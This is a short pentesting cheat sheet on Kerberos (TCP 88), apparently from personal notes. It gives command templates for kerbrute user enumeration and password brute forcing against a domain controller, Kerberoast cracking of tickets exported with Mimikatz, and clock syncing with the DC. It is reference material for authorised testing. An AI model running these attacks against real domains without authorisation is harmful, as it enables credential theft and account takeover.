# TCP 88: Kerberos

> Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))</cite>

## Related

* [Active Directoy](/XX-services/03-misc/Active-Directoy.md)
* [TCP 389, 636, 3268, 3269: LDAP](/XX-services/01-tcp/TCP-389-636-3268-3269-LDAP.md)
* [Impacket](/XX-misc/08-impacket.md)

## kerbrute

A tool to perform Kerberos pre-auth bruteforcing  
[GitHub - ropnop/kerbrute](https://github.com/ropnop/kerbrute)

Enumerate users
```bash
./kerbrute_linux_386 userenum -d <domain> --dc <domaincontroller> <usernames.txt>
```

bruteforce password of one user
```bash
./kerbrute_linux_386 bruteuser -d <domain> --dc <domaincontroller> <password-list> <username@domain>
```

## Kerberoast

Install
```bash
sudo apt install kerberoast
```

Use exported tickets from [Mimikatz](/04-privilege-escalation/02-windows/02-mimikatz.md)
```bash
python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <exported-tickets-file>
```

## Sync time

It's necessary to sync the client time to the domain controller.  

**Error** (when not synced)  
> SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  

### ntpdate

```bash
ntpdate <dc-ip>
```

### Manually

**Get server time**
```bash
nmap -sC -sV <ip>
```

```
Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-20T00:14:12
|_  start_date: N/A
```

**Set local time accordingly**
```bash
date -s "20 Mar 2020 00:14:12+00:00"
```
